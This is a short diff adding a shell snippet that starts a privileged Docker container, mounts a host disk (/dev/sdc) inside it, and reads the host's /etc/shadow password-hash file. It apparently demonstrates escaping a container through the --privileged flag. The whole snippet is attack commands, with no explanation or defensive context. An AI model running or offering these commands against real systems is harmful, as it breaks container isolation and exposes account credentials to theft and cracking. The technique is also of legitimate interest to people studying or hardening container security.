@@ -1,0 +1,9 @@
+docker run --rm -it --privileged ubuntu bash
+
+mkdir /mnt/gotcha
+mount /dev/sdc /mnt/gotcha
+cd /mnt/gotcha
+ls -l
+
+cat /mnt/gotcha/etc/shadow
+
